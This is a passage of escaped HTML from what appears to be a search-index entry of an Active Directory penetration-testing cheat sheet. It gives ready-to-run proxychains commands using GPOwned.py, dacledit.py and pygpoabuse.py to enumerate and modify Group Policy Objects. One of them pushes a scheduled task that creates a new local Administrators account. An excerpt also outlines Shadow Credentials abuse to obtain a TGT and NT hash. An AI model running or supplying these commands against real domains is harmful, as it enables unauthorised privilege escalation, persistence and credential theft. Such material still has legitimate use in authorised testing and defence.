</span>&lt;dc-ip&gt;<span class=\"w\"> </span>-gpcmachine<span class=\"w\"> </span>-listgpo\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>GPOwned.py<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-gpcmachine<span class=\"w\"> </span>-listgplink\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>examples/dacledit.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class=\"w\"> </span>-target-dn<span class=\"w\"> </span><span class=\"s2\">&quot;CN={&lt;GPO-GUID&gt;},CN=Policies,CN=System,DC=&lt;domain&gt;,DC=local&quot;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>GPOwned.py<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-gpcmachine<span class=\"w\"> </span>-backup<span class=\"w\"> </span>backupgpo<span class=\"w\"> </span>-name<span class=\"w\"> </span><span class=\"s2\">&quot;{&lt;GPO-GUID&gt;}&quot;</span>\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>pygpoabuse.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class=\"w\"> </span>-gpo-id<span class=\"w\"> </span>&lt;GPO-GUID&gt;<span class=\"w\"> </span>-command<span class=\"w\"> </span><span class=\"s2\">&quot;net user &lt;newuser&gt; &lt;password&gt; /add &amp;&amp; net localgroup Administrators &lt;newuser&gt; /add&quot;</span><span class=\"w\"> </span>-taskname<span class=\"w\"> </span><span class=\"s2\">&quot;PT_LocalAdmin&quot;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-v\n</code></pre></div>", "excerpt": "Shadow Credentials Abuse msDS-KeyCredentialLink write access to add a certificate-based credential to a target account, then request a TGT and extract the NT hash without changing the password. Check ", "tags": []}